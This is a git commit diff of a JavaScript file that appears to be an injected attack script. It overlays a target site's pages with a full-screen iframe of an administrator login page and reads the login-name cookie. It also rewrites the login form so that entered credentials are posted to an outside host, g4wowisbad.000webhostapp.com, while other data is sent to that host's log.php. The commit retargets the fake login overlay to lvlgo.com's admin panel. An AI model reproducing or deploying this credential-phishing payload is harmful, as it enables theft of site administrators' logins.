437a5650d04c7d4627eb56e78a76339a4db8c593
9os <druidboykoston@gmail.com>
2017-01-31 06:33:18 +0000

    Add files via upload

--- a.js
+++ a.js
@@ -19,7 +19,7 @@ imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
 
 //Let page load first
 document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
-document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='/admin_g4wow/Login.aspx'></iframe>" + document.body.innerHTML;
+document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='https://www.lvlgo.com/admin_lvlgo/Login.aspx'></iframe>" + document.body.innerHTML;
 var prevTitle = document.title;
 document.title = "网站管理系统";
 
@@ -28,7 +28,7 @@ $("#login_iframe").load(function(){
 	$("#login_iframe").contents().find("#form1")[0].action = "//g4wowisbad.000webhostapp.com/login.php";
 	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
 	$("#login_iframe").contents().find("#form1").submit(function(){
-		$("#login_iframe").attr("src", "/admin_g4wow/Login.aspx");
+		$("#login_iframe").attr("src", "https://www.lvlgo.com/admin_lvlgo/Login.aspx");
 		$("#login_iframe").delay(1000).hide(0);
 		document.title = prevTitle;
 	});
